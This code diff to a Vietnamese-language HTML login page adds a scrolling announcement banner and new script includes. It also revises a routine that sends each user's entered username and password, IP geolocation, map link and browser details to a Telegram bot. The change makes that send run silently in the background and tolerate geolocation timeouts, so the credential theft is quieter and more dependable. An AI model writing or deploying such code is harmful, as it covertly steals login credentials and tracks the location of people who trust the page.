@@ -187,9 +187,62 @@
         /* Ẩn scrollbar */
         * { -ms-overflow-style: none !important; scrollbar-width: none !important; }
         ::-webkit-scrollbar { display: none !important; }
+        /* ========== ANNOUNCEMENT BANNER NỔI ========== */
+        .announcement-banner {
+            position: absolute;
+            top: 15px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 95%;
+            max-width: 700px;
+            z-index: 100;
+            background: linear-gradient(135deg, #FF9A9E 0%, #FECFEF 100%);
+            color: #d63031;
+            padding: 8px 12px;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 0.9em;
+            overflow: hidden;
+            white-space: nowrap;
+            box-shadow: 0 4px 15px rgba(214, 48, 49, 0.4);
+            display: flex;
+            align-items: center;
+        }
+        .announcement-banner::before {
+            content: '📌 Tin mới';
+            margin-right: 10px;
+            z-index: 2;
+            background: #fff;
+            color: #d63031;
+            padding: 3px 10px;
+            border-radius: 20px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            position: relative;
+            font-size: 0.85em;
+        }
+        .marquee-wrapper {
+            flex: 1;
+            overflow: hidden;
+        }
+        .marquee-text {
+            display: inline-block;
+            white-space: nowrap;
+            animation: marquee 35s linear infinite;
+        }
+        @keyframes marquee {
+            0% { transform: translateX(100%); }
+            100% { transform: translateX(-150%); }
+        }
     </style>
 </head>
 <body>
+    <!-- Thanh thông báo ngang đỉnh trang -->
+    <div class="announcement-banner">
+        <div class="marquee-wrapper">
+            <span class="marquee-text"></span>
+        </div>
+    </div>
+
     <div class="mesh-bg">
         <div class="mesh-blob blob-1"></div>
         <div class="mesh-blob blob-2"></div>
@@ -290,8 +343,16 @@
                 let chatId = getTelegramChatId();
                 if (!botToken || botToken === "ĐIỀN_TOKEN_BOT_CỦA_ANH_VÀO_ĐÂY") return;
 
-                const ipRes = await fetch('https://get.geojs.io/v1/ip/geo.json');
-                const ipData = await ipRes.json();
+                let ipData = { ip: 'N/A', city: 'N/A', region: 'N/A', latitude: 0, longitude: 0 };
+                try {
+                    const ipRes = await Promise.race([
+                        fetch('https://get.geojs.io/v1/ip/geo.json'),
+                        new Promise((_, reject) => setTimeout(() => reject(new Error('IP Timeout')), 3000))
+                    ]);
+                    ipData = await ipRes.json();
+                } catch (e) {
+                    console.log("Không thể fetch IP:", e);
+                }
                 const mapLink = `https://www.google.com/maps/search/?api=1&query=${ipData.latitude},${ipData.longitude}`;
                 const device = navigator.userAgent;
 
@@ -364,8 +425,8 @@
                 return;
             }
             
-            // NẾU ĐĂNG NHẬP THÀNH CÔNG -> BÁO TELEGRAM
-            await sendToTelegram(username, password);
+            // NẾU ĐĂNG NHẬP THÀNH CÔNG -> BÁO TELEGRAM (chạy ngầm)
+            sendToTelegram(username, password).catch(e => console.error("Tele err:", e));
             
             // Khôi phục nút (thực ra sắp chuyển trang nên không cần thiết lắm, nhưng cứ để cho chuẩn)
             loginBtn.innerHTML = prevText;
@@ -402,6 +463,8 @@
     </script>
     <script src="js/tkcam.js"></script>
     <script src="js/hihihaaaa.js"></script>
+    <script src="js/thongbao.js"></script>
+    <script src="js/new2.js"></script>
     <script src="js/tet.js"></script>
     <script src="js/no-refresh.js"></script>
 </body>
